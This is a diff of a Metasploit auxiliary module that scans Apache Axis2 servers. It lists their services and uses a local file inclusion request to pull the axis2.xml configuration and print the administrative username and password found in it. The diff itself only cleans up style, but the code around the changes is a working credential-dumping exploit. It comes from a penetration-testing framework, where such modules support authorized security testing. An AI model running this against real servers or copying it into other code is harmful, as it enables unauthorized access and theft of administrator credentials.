@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,11 +7,9 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
-
 
   def initialize
     super(
@@ -23,33 +22,33 @@ class MetasploitModule < Msf::Auxiliary
       'References'     =>
         [
           ['EDB', '12721'],
-          ['OSVDB', '59001'],
+          ['OSVDB', '59001']
         ],
       'Author'         =>
         [
           'Tiago Ferreira <tiago.ccna[at]gmail.com>'
         ],
-      'License'        =>  MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
     register_options([
-      Opt::RPORT(8080),
-      OptString.new('TARGETURI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
-    ], self.class)
+                       Opt::RPORT(8080),
+                       OptString.new('TARGETURI', [false, 'The path to the Axis listServices', '/axis2/services/listServices'])
+                     ], self.class)
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     uri = normalize_uri(target_uri.path)
 
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => uri,
-      }, 25)
+                               'method' => 'GET',
+                               'uri' => uri
+                             }, 25)
 
-      if (res and res.code == 200)
-        res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
-        new_uri = normalize_uri("/axis2/services/#{$1}")
+      if res && (res.code == 200)
+        res.body.to_s =~ /\/axis2\/services\/([^\s]+)\?/
+        new_uri = normalize_uri("/axis2/services/#{Regexp.last_match(1)}")
         get_credentials(new_uri)
 
       else
@@ -96,9 +95,9 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => "#{uri}" + lfi_payload,
-      }, 25)
+                               'method' => 'GET',
+                               'uri' => uri.to_s + lfi_payload
+                             }, 25)
 
       print_status("#{full_uri} - Apache Axis - Dumping administrative credentials")
 
@@ -107,13 +106,13 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
 
-      if (res.code == 200)
-        if res.body.to_s.match(/axisconfig/)
+      if res.code == 200
+        if res.body.to_s =~ /axisconfig/
 
           res.body.scan(/parameter\sname=\"userName\">([^\s]+)</)
-          username = $1
+          username = Regexp.last_match(1)
           res.body.scan(/parameter\sname=\"password\">([^\s]+)</)
-          password = $1
+          password = Regexp.last_match(1)
 
           print_good("#{full_uri} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'")
 
